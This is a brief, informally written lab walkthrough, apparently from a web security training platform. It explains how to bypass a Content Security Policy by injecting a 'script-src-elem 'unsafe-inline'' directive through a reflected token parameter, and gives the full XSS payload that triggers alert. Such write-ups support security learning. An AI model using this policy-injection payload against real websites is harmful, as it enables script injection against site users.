 This lab uses CSP  (Content Security Policy) and contains a reflected XSS vulnerability.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.

Please note that the intended solution to this lab is only possible in Chrome. because crome can override the script-src 


we know since csp only allow server provided tag to execute 


we will use this token to bypass csp because token is a perameter we can add anything since its blank

Also token is a part of csp


&token=;script-src-elem 'unsafe-inline'


now we will add in the website url like this

<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'



Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=


script-src-elem 'unsafe-inline'

